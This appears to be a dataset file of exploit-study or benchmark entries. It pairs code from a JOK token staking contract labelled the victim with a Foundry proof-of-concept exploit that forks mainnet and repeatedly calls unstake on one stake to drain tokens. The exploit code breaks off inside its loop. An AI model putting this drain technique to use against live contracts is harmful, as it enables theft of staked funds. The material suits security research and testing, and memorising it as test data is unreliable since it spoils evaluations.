@@ -1,0 +1,198 @@
+[
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "stake",
+    "original_code": "    function stake(uint256 amount, uint256 lockPeriod) external {\n        require(validLockPeriods[lockPeriod].isValid, \"Invalid lock period!\");\n\n        uint256 currentDay = getCurrentDay();\n\n        stakes[msg.sender].push(Stake({\n                unstaked: false,\n                amountStaked: amount,\n                lockPeriod: lockPeriod,\n                stakedDay: currentDay,\n                unstakedDay: 0\n        }));\n        totalStaked += amount;\n\n        jokToken.transferFrom(msg.sender, address(this), amount); // Transfer JOK from user to the contract\n\n        emit NewStake(msg.sender, amount, block.timestamp, lockPeriod, stakes[msg.sender].length - 1);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "unstake",
+    "original_code": "    function unstake(uint256 stakeIndex) external {\n        require(stakeIndex < stakes[msg.sender].length, \"Invalid stake index!\");\n        Stake memory currentStake = stakes[msg.sender][stakeIndex];\n\n        uint256 currentDay = getCurrentDay();\n\n        require(currentDay > currentStake.stakedDay + currentStake.lockPeriod, \"Lock period has not finalized!\");\n        stakes[msg.sender][stakeIndex].unstaked = true;\n        stakes[msg.sender][stakeIndex].unstakedDay = currentDay;\n\n        totalStaked -= currentStake.amountStaked;\n        // Transfer back staked amount\n        require(jokToken.transfer(msg.sender, currentStake.amountStaked), \"Token transfer failed!\");\n\n        emit Unstake(msg.sender, currentStake.amountStaked, block.timestamp, currentStake.lockPeriod, stakeIndex);\n\n    }\n\n    ///\n    /// MISC\n    ///\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "validLockPeriods",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJokInTheBox",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 earnings, uint256 affiliateEarnings, bool inETH, string memory message, uint8 _v, bytes32 _r, bytes32 _s) external {\n        // Validate the ECDSA signature for secure withdrawal\n        uint256 totalEarnings = earnings + affiliateEarnings;\n\n        require(isValidSignature(msg.sender, totalEarnings, inETH, message, _v, _r, _s), \"Invalid signature!\");\n\n        if (inETH) {\n            require(totalEarnings < (address(this).balance * maxPercentage) / 100, \"Earnings are above 10% of the contract balance!\");\n        }\n        else {\n            require(totalEarnings < (jokToken.balanceOf(address(this)) * maxPercentage) / 100, \"Earnings are above 10% of the contract balance!\");\n        } \n\n        uint256 currentDay = getCurrentDay();\n\n        stakers[msg.sender].rewardsClaimed += earnings;\n        stakers[msg.sender].lastClaimDay = currentDay;\n\n        // Update affiliate commission information\n        affiliateCommissions[msg.sender].totalClaimed += earnings;\n        affiliateCommissions[msg.sender].lastClaimDay = currentDay;\n\n        nonce[msg.sender]++;\n\n        // Transfer funds\n        if (inETH) {\n            // Calculate and deduct the ETH tax\n            uint256 fee = (totalEarnings * ethTax) / 100;\n            totalEarnings -= fee;\n\n            // Transfer ETH to user\n            (bool sent, ) = payable(msg.sender).call{value: totalEarnings}(\"\");\n            require(sent, \"Failed to send Ether\");\n        } else {\n            // Transfer JOK tokens to user\n            require(jokToken.transfer(msg.sender, totalEarnings), \"Token transfer failed!\");\n        }\n\n        emit Withdraw(msg.sender, earnings + affiliateEarnings, inETH);\n\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_054_628);\n        jok_.approve(address(router_), type(uint256).max);\n        jok_.approve(address(jokStake_), type(uint256).max);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JokInTheBoxExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        address[] memory path = new address[](2);\n        path[0] = address(weth_); // weth\n        path[1] = address(jok_); // token\n\n        vm.deal(address(this), 0.2 ether); // flashLoan\n        router_.swapExactETHForTokens{value: 0.2 ether}(0, path, address(this), block.timestamp);\n\n        jokStake_.stake(jok_.balanceOf(address(this)), 1);\n\n        vm.warp(block.timestamp + 3 days);\n        while (true) {\n            try jokStake_.unstake(0) {}\n            catch {\n                break;\n            }\n",
+    "description": ""
+  }
+]
